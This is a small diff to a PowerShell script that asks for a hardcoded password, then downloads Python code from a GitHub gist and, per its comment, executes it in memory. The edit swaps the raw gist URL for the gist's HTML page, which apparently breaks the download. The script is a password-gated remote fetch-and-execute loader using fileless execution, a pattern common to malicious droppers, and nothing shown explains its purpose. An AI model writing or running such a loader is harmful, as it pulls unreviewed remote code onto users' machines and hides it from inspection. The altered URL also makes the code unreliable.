@@ -10,7 +10,7 @@ $pass = Read-Host "Enter Access Password"
 
 if ($pass -eq "Dinesh") {
     Write-Host "[+] Authentication Successful. Fetching Engine..." -ForegroundColor Green
-    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
+    $url = "https://gist.github.com/urflameww/e0685a4f3ab6325dceda596f7f45d611"
     $code = (New-Object Net.WebClient).DownloadString($url)
     
     # Execute Python in RAM
